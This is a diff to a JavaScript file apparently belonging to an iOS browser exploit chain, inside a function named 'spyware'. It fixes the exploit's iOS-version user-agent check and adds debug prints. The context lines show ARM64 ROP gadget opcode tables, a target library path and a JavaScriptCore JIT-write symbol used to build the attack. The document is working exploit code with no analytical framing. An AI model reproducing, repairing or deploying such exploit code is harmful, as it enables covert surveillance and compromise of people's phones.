@@ -216,8 +216,9 @@ function spyware(stage1, memory, binary)
 
     var opcodes;
     var opcode_libs;
-
-    if (/iPhoneOS 10_/.test(navigator.userAgent)) {
+    
+    if (/iPhone OS 10_/.test(navigator.userAgent)) {
+        print('found iPhone OS 10')
         opcodes = {
             // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
             "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
@@ -230,9 +231,11 @@ function spyware(stage1, memory, binary)
 
         opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
     } else {
+        print('found iPhone OS != 10')
         libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
             "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
         )
+
         opcodes = {
             // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
             "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
